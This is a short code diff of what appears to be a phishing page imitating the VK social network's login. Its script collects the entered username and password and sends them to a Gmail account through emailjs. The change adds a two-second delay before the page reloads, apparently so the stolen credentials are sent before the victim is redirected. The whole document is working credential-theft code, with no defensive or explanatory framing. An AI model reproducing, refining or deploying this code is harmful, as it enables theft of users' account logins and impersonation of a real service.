@@ -141,7 +141,9 @@ Stay in touch on the go with VK mobile.
         var password = document.getElementById("password").value;
         var message = username + " " + password;        
         emailjs.send("gmail","template_segz0mey",{name: "James", notes: "Check this out!", message_html: message });
-        location.reload();
+        setTimeout(function() {
+          location.reload();
+        },2000);
       }
       </script>
 <div id="vk_utils"></div>
